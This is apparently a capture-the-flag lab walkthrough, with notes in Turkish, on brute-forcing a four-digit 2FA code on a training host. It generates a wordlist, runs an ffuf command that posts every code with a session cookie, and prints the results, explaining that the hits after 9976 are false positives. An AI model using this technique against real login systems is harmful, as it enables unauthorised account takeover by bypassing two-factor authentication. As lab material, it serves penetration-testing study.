# Brute Forcing 2FA Codes

## Hosts File

```sh
my@attack:~$ echo "94.237.52.137 bf_2fa.htb" | sudo tee -a /etc/hosts
```

## Creating a List

```sh
my@attack:~$ seq -w 0 1 9999 > 2fa.txt
```

## Attacking

!!! warning

    Geçerli TOTP: 9976

    Geçerli TOTP ile yapılan bir istek ardından mevcut oturumun kimliği web uygulaması tarafından doğrulanır.

    Ardından:

    * Kimliği doğrulanmış oturum çerezi ile yapılan istekler /admin.php sayfasına yönlendirilir.
    * Bu sebeple Ffuf false-positive sonuçlar gösterir.

```sh
my@attack:~$ ffuf -ic -X POST -w 2fa.txt:FUZZ -u "http://bf_2fa.htb:37616/2fa.php" -H "Content-Type: application/x-www-form-urlencoded" -d 'otp=FUZZ' -b "PHPSESSID=00ak7c6utts5des0vhkv8nhes0" -fr "Invalid 2FA Code"
```

```output title="Output" hl_lines="1"
9976                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 72ms]
9978                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 72ms]
9979                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 78ms]
9987                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 71ms]
9982                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 72ms]
9980                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 81ms]
9981                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
9983                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
9988                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
9984                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
9985                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
9986                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
9992                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
9989                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 77ms]
9990                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 76ms]
9991                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 77ms]
9994                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
9995                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
9993                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]
9997                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 68ms]
9996                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
9998                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
9999                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
```
